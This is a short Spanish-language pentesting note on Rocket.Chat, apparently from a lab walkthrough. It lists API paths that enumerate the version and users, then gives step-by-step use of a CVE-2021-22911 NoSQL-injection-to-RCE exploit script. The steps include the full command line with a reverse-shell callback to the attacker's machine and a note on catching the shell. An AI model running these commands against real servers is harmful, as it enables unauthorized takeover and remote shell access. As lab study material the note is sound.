# Rocket.Chat 

Tags: #RocketChat #Linux 

Rocket.Chat es una plataforma de mensajería y colaboración para equipos, parecida a Slack. Permite conversar en canales y mensajes privados, compartir archivos y hacer llamadas. Se puede usar en la nube o instalar en servidores propios.


```bash 
# Rutas desde la web

	http://IP/api/info     # Mirar la versión de la aplicación 
	http://IP/api/v1/users.list
```

## NoSQL Injection to RCE (Unauthenticated) - Versión 3.12.1

* [CVE-2021-22911](https://www.exploit-db.com/exploits/50108)

```bash 
Dentro de la aplicación se puede observar el correo del usuario 'admin' el cual es: 'local0ste@domain.local'
```

```bash 
# Instalar lo que falta para usar el script 
❯ python3 -m venv .venv && source .venv/bin/activate && python -m pip install oathtool requests
```

* [50108-modified.py](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2026/exception)

```bash 
NOTA: El siguiente comando es para un script de python modificado

❯ python 50108-modified.py -t http://IP:3000/ -u 'test@test.com' -U 'test' -p 'test123' -a 'local0ste@domain.local' -A 'localh0ste' -H IP_Kali -P 4446

	# -u: correo del usuario con pocos privilegios, sin 2FA.
	# -U: nombre de usuario de esa cuenta.
	# -p: contraseña de esa cuenta.
	# -a: correo del administrador.
	# -A: nombre de usuario del administrador.
	# -t: URL de Rocket.Chat.
	# -H: dirección del host para la conexión inversa (IP de Kali)
	# -P: puerto para la conexión inversa (Puerto en Kali)

NOTA:
	- Si penelope muestra algún tipo de error y da opciones, escoger la 3 o 4 y se obtendra una shell 
```